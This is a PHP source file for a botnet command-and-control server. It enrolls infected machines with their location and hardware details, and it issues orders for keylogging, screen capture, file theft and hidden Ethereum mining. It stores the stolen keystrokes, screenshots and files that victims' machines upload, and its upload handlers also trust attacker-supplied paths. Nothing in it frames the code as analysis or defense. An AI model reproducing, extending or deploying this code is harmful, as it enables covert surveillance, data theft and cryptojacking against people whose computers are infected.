<?php
session_start();
require_once '../autoload.php';
include '../connect.php';
require_once './autoload.php';

$c2ServerUrl = $_ENV['c2_server_url'];
$latestProgramVersion = $_ENV['latest_software_version'];
$ethminerUrl = $c2ServerUrl . $_ENV['ethminer_path'];

if (!isset($_POST["operation"])) {
	header("HTTP/1.1 500 Internal Server Error");
	return;
}

// Get Latest Program Version
if ($_POST["operation"] == "getLatestProgramVersion") {
	echo $latestProgramVersion;
	return;
}

// Get Latest Ethminer URL
if ($_POST["operation"] == "getLatestEthminerURL") {
	echo $ethminerUrl;
	return;
}

// Get valid base URL
if ($_POST["operation"] == "getC2ServerUrl") {
	echo $c2ServerUrl;
	return;
}

// Initialize
if ($_POST["operation"] == "initialize") {
	$coordinates = json_decode($_POST["coordinates"], true);
	$latitude = $coordinates["lat"];
	$longitude = $coordinates["lon"];
	$machineID = getValidMachineID($conn);
	$stmt = $conn->prepare("INSERT INTO command (`machineID`,`password`,`system`,`programVersion`,`latitude`,`longitude`, `first_signal`, `last_signal`) VALUES (?,?,?,?,?,? , CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)");
	$passwordHash = hash('sha256', mysqli_real_escape_string($conn, $_POST["password"]));
	$stmt->bind_param("ssssdd", $machineID, $passwordHash, $_POST["system"], $_POST["programVersion"], $latitude, $longitude);
	$stmt->execute();
	$stmt = $conn->prepare("INSERT INTO `specs` (`machineID`, `account`, `os`, `language`, `motherboard`, `memory`, `bios`, `cpu`, `gpu`, `audio`, `network`, `harddrives`, `cdrom`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);");
	$stmt->bind_param("sssssssssssss", $machineID, $_POST["account"], $_POST["os"], $_POST["language"], $_POST["motherboard"], $_POST["memory"], $_POST["bios"], $_POST["cpu"], $_POST["gpu"], $_POST["audio"], $_POST["network"], $_POST["harddrives"], $_POST["cdrom"]);
	$stmt->execute();
	mkdir(__DIR__ . "../machines/$machineID", 0700, true);
	mkdir(__DIR__ . "../machines/$machineID/keys", 0700, true);
	mkdir(__DIR__ . "../machines/$machineID/screens", 0700, true);
	mkdir(__DIR__ . "../machines/$machineID/files", 0700, true);
	echo $machineID;
	return;
}

if (isset($_POST["machineID"]) && isset($_POST["password"]) && checkPassword($conn, $_POST["machineID"], $_POST["password"])) {
	updateTimestamp($conn, $_POST["machineID"]);
	// Update machine data
	if ($_POST["operation"] == "updateHardwareData") {
		$stmt = $conn->prepare("UPDATE specs SET account=?, os=?, language=?, motherboard=?, memory=?, bios=?, cpu=?, gpu=?, audio=?, network=?, harddrives=?, cdrom=? WHERE machineID=?");
		$stmt->bind_param("sssssssssssss", $_POST["account"], $_POST["os"], $_POST["language"], $_POST["motherboard"], $_POST["memory"], $_POST["bios"], $_POST["cpu"], $_POST["gpu"], $_POST["audio"], $_POST["network"], $_POST["harddrives"], $_POST["cdrom"], $_POST["machineID"]);
		$stmt->execute();
		$stmt = $conn->prepare("UPDATE command SET inspectHardware=0 WHERE machineID=?");
		$stmt->bind_param("s", $_POST["machineID"]);
		$stmt->execute();
		return;
	}
	// Uninstalled
	elseif ($_POST["operation"] == "uninstalled") {
		$stmt = $conn->prepare("UPDATE command SET uninstalled=1 WHERE machineID=?");
		$stmt->bind_param("s", $_POST["machineID"]);
		$stmt->execute();
		return;
	}
	// Update Status Info
	elseif ($_POST["operation"] == "updateStatusInfo") {
		$stmt = $conn->prepare("UPDATE command SET programVersion=?, lat=?, lon=?, last_signal=CURRENT_TIMESTAMP WHERE machineID=?");
		$stmt->bind_param("sdds", $_POST["programVersion"], $_POST["lat"], $_POST["lon"], $_POST["machineID"]);
		$stmt->execute();
		return;
	}
	// Get Orders
	elseif ($_POST["operation"] == "getOrders") {
		$stmt = $conn->prepare("SELECT * FROM command WHERE machineID=?");
		$stmt->bind_param("s", $_POST["machineID"]);
		$stmt->execute();
		$result = $stmt->get_result();
		while ($row = $result->fetch_assoc()) {
			$orders->inspectHardware       = $row["inspectHardware"];
			$orders->inspectFiles          = $row["inspectFiles"];
			$orders->ordersInterval        = $row["ordersInterval"];
			$orders->keylogger             = $row["keylogger"];
			$orders->screenCapture         = $row["screenCapture"];
			$orders->screenCaptureInterval = $row["screenCaptureInterval"];
			$orders->filesCapture          = $row["filesCapture"];
			$orders->mining                = $row["mining"];
			$orders->uninstall             = $row["uninstall"];
			echo json_encode($orders);
		}
		return;
	}
	// Get interesting files
	elseif ($_POST["operation"] == "getInterestingFiles") {
		$stmt = $conn->prepare("SELECT interestingFiles FROM command WHERE machineID=?");
		$stmt->bind_param("s", $_POST["machineID"]);
		$stmt->execute();
		$result = $stmt->get_result();
		while ($row = $result->fetch_assoc()) {
			echo $row["interestingFiles"];
		}
		return;
	}
	// Notify files upload completed
	elseif ($_POST["operation"] == "notifyFilesUploadCompleted") {
		$stmt = $conn->prepare("UPDATE command SET filesCapture=0 WHERE machineID=?");
		$stmt->bind_param("s", $_POST["machineID"]);
		$stmt->execute();
		$stmt = $conn->prepare("UPDATE command SET interestingFiles='' WHERE machineID=?");
		$stmt->bind_param("s", $_POST["machineID"]);
		$stmt->execute();
		return;
	}
	// Upload index file
	elseif ($_POST["operation"] == "uploadIndexFile" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
		$filesPath = __DIR__ . "../machines/" . $_POST['machineID'] . "/files/";
		recursiveMakeDir("", $filesPath);
		$stmt = $conn->prepare("UPDATE command SET inspectFiles=0 WHERE machineID=?");
		$stmt->bind_param("s", $_POST["machineID"]);
		$stmt->execute();
		$temp_location = $_FILES["file"]["tmp_name"];
		$new_location = __DIR__ . "../machines/" . $_POST['machineID'] . "/" . $_FILES["file"]["name"];
		move_uploaded_file($temp_location, $new_location);
		return;
	}
	// Upload file
	elseif ($_POST["operation"] == "uploadFile" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
		$temp_location = $_FILES["file"]["tmp_name"];
		$filesPath = __DIR__ . "../machines/" . $_POST['machineID'] . "/files/";
		recursiveMakeDir($filesPath, $_POST['localPathFile']);
		$new_location = $filesPath . $_POST['localPathFile'] . "/" . $_FILES["file"]["name"];
		move_uploaded_file($temp_location, $new_location);
		return;
	}
	// Upload screen
	elseif ($_POST["operation"] == "uploadScreen" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
		$temp_location = $_FILES["file"]["tmp_name"];
		$new_location = __DIR__ . "../machines/" . $_POST['machineID'] . "/screens/" . $_FILES["file"]["name"];
		move_uploaded_file($temp_location, $new_location);
		return;
	}
	// Upload keys
	elseif ($_POST["operation"] == "uploadKeys" && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
		$temp_location = $_FILES["file"]["tmp_name"];
		$new_location = __DIR__ . "../machines/" . $_POST['machineID'] . "/keys/" . $_FILES["file"]["name"];
		move_uploaded_file($temp_location, $new_location);
		return;
	}

	header("HTTP/1.1 500 Internal Server Error");
}
